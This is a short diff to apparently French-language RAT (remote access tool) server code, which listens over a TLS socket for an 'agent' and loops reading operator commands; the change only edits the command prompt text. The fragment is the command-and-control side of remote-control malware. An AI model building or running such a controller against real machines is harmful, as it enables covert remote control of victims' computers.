@@ -26,7 +26,7 @@ with context.wrap_socket(server_socket, server_side=True) as ssl_socket:
     print("[+] Agent received !")
 
     while True:
-        command = input("rat > Taper votre commande ici")
+        command = input("rat > Taper votre commande ici : ")
         if command.lower() == 'exit':
             client_socket.send(b'exit')
             break
